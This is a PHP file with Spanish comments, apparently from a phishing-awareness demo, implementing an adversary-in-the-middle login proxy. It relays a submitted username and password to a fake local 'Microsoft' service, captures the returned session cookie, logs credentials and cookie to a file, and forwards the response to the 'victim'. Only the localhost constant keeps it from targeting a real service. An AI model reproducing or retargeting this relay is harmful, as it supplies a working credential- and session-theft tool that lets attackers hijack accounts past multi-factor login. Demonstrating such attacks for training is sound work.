<?php
/*
 * proxy_relay.php — FUNCIONAL, actúa como proxy real, pero ÚNICAMENTE
 * contra fake_upstream.php (nuestro propio "Microsoft" de mentira — ver
 * ese archivo). Jamás se conecta a ningún dominio externo: el destino es
 * SIEMPRE 127.0.0.1, en un segundo puerto local (ver HOW_TO_RUN_LOCALLY.md
 * — necesitas dos `php -S` corriendo, exactamente como un proxy real
 * habla con OTRO servidor. El servidor integrado de PHP es de un solo
 * hilo y no puede llamarse a sí mismo en el mismo puerto).
 *
 * Usa streams nativas de PHP (file_get_contents + stream_context) en vez
 * de curl, para que funcione en cualquier instalación de PHP sin
 * necesitar la extensión curl. Ver annotations.md, secciones 2-3.
 */

const UPSTREAM_URL = "http://127.0.0.1:8099/fake_upstream.php"; // SIEMPRE localhost

$user = $_POST['username'] ?? null;
$pass = $_POST['password'] ?? null;

if (!$user || !$pass) {
    header('Location: index.html');
    exit;
}

// 1. Reenvía la petición al "servicio real" — que aquí es SIEMPRE
//    127.0.0.1, nunca un dominio externo:
$post_data = http_build_query(['username' => $user, 'password' => $pass]);
$context = stream_context_create([
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n" .
                     "Content-Length: " . strlen($post_data) . "\r\n",
        'content' => $post_data,
        'timeout' => 5,
        'ignore_errors' => true,
    ],
]);

$response = @file_get_contents(UPSTREAM_URL, false, $context);

if ($response === false) {
    header('Content-Type: text/plain');
    echo "No se pudo contactar con el 'Microsoft' de mentira.\n";
    echo "¿Arrancaste también fake_upstream.php en el puerto 8099? Ver HOW_TO_RUN_LOCALLY.md.";
    exit;
}

// 2. El servicio (de mentira) responde con una cookie de sesión ya
//    autenticada — el proxy la copia mirando las cabeceras de respuesta:
$captured_session = null;
foreach (($http_response_header ?? []) as $header) {
    if (preg_match('/ESTSAUTH_DEMO=([a-f0-9]+)/', $header, $matches)) {
        $captured_session = $matches[1];
        break;
    }
}

if ($captured_session) {
    $log_line = "Usuario: $user\nClave: $pass\nCookie de sesión capturada: $captured_session\nFecha: " . date('c') . "\n";
    file_put_contents(__DIR__ . '/__DEMO_LOG__.txt', "=== sesión interceptada ===\n$log_line\n", FILE_APPEND);
}

// 3. Y la víctima recibe la respuesta real (de nuestro Microsoft de
//    mentira) como si nada hubiera pasado — el mismo patrón que en un
//    ataque de verdad, pero contra un servicio 100% local e inventado:
header('Content-Type: text/plain');
echo "=== Lo que vería la víctima (respuesta reenviada del servicio de mentira) ===\n\n";
echo $response;
echo "\n\n=== FIN DEMO — revisa __DEMO_LOG__.txt para ver lo que el proxy interceptó ===";
